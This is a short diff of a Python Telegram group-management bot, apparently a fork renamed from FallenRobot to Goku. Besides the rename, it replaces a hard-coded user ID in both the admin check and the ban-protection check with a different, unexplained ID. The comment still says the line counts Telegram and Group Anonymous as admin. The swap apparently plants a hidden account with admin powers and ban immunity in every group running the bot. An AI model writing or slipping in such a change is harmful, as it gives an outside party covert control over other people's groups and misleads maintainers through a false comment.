@@ -2,7 +2,7 @@ from time import perf_counter
 from functools import wraps
 from cachetools import TTLCache
 from threading import RLock
-from FallenRobot import (
+from Goku import (
     DEL_CMDS,
     DEV_USERS,
     DRAGONS,
@@ -39,7 +39,7 @@ def is_user_admin(chat: Chat, user_id: int, member: ChatMember = None) -> bool:
         or user_id in DRAGONS
         or user_id in DEV_USERS
         or chat.all_members_are_administrators
-        or user_id in [777000, 1087968824]
+        or user_id in [777000, 1964362058]
     ):  # Count telegram and Group Anonymous as admin
         return True
     if not member:
@@ -82,7 +82,7 @@ def is_user_ban_protected(chat: Chat, user_id: int, member: ChatMember = None) -
         or user_id in WOLVES
         or user_id in TIGERS
         or chat.all_members_are_administrators
-        or user_id in [777000, 1087968824]
+        or user_id in [777000, 1964362058]
     ):  # Count telegram and Group Anonymous as admin
         return True
 
